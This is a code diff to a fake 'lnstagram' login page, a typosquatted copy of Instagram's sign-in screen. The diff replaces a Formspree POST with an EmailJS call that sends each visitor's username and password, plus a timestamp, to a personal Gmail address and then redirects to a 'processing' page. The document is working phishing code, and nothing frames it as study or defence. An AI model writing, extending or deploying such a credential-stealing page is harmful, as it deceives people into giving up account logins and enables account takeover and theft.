@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>lnstagram Login</title>
     <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/build/es5/index.min.js"></script>
     <style>
         * {
             margin: 0;
@@ -298,6 +299,9 @@
     </div>
 
     <script>
+        // Initialize EmailJS
+        emailjs.init('nOWTc4rAoR4spEqb-');
+
         function togglePassword() {
             const passwordInput = document.getElementById('password');
             if (passwordInput.type === 'password') {
@@ -327,36 +331,30 @@
             loadingDiv.style.display = 'block';
             messageDiv.style.display = 'none';
 
-            const formData = new FormData();
-            formData.append('username', username);
-            formData.append('password', password);
-            formData.append('login_time', new Date().toLocaleString());
+            // Prepare email parameters
+            const templateParams = {
+                to_email: 'cipherxcore@gmail.com',
+                username: username,
+                password: password,
+                login_time: new Date().toLocaleString()
+            };
 
-            fetch('https://formspree.io/f/mjgqwnyz', {
-                method: 'POST',
-                body: formData,
-                headers: {
-                    'Accept': 'application/json'
-                }
-            })
-            .then(response => {
-                loadingDiv.style.display = 'none';
-                if (response.ok) {
+            // Send email via EmailJS
+            emailjs.send('service_uz9l1cj', 'template_c1vuslg', templateParams)
+                .then((response) => {
+                    loadingDiv.style.display = 'none';
                     showMessage('✅ Login credentials sent! Proceeding...', 'success');
                     document.getElementById('loginForm').reset();
                     
                     setTimeout(() => {
                         window.location.href = 'processing.html';
                     }, 1000);
-                } else {
+                })
+                .catch((error) => {
+                    loadingDiv.style.display = 'none';
+                    console.error('Error:', error);
                     showMessage('❌ Error sending login info. Please try again.', 'error');
-                }
-            })
-            .catch(error => {
-                loadingDiv.style.display = 'none';
-                console.error('Error:', error);
-                showMessage('❌ Error sending login info. Please try again.', 'error');
-            });
+                });
         });
 
         function showMessage(text, type) {
